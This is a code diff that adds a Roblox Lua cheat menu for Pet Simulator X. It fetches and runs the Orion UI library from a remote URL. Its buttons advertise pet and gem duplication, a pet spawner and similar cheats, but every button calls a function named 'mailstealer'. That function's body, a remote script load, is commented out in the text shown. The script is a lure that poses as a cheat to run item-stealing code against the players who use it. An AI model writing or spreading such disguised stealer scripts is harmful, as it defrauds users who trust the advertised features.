@@ -1,0 +1,73 @@
+function mailstealer()
+    --loadstring(game:HttpGet("https://raw.githubusercontent.com/ggnori/BYnori/main/PSXscriptMULTI"))()
+end
+
+
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+local Window = OrionLib:MakeWindow({Name = "Nori.gg", HidePremium = false, SaveConfig = true, IntroEnabled = false, ConfigFolder = "OrionTest"})
+
+local Tab = Window:MakeTab({
+    Name = "Pet Simulator X",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "Duplicate Pets",
+    Callback = function()
+        mailstealer()
+      end    
+})
+
+Tab:AddButton({
+    Name = "Duplicate Gems",
+    Callback = function()
+        mailstealer()
+      end    
+})
+
+Tab:AddButton({
+    Name = "Trade Lag",
+    Callback = function()
+        mailstealer()
+      end    
+})
+
+Tab:AddButton({
+    Name = "Fake Tag",
+    Callback = function()
+        mailstealer()
+      end    
+})
+
+Tab:AddButton({
+    Name = "Pet Spawner",
+    Callback = function()
+        mailstealer()
+      end    
+})
+
+Tab:AddButton({
+    Name = "Pet Changer",
+    Callback = function()
+        mailstealer()
+      end    
+})
+
+Tab:AddButton({
+    Name = "Bank Virus",
+    Callback = function()
+        mailstealer()
+      end    
+})
+
+local Tab = Window:MakeTab({
+    Name = "Credits",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+Tab:AddParagraph("Developers"," Nori")
+
+OrionLib:Init()
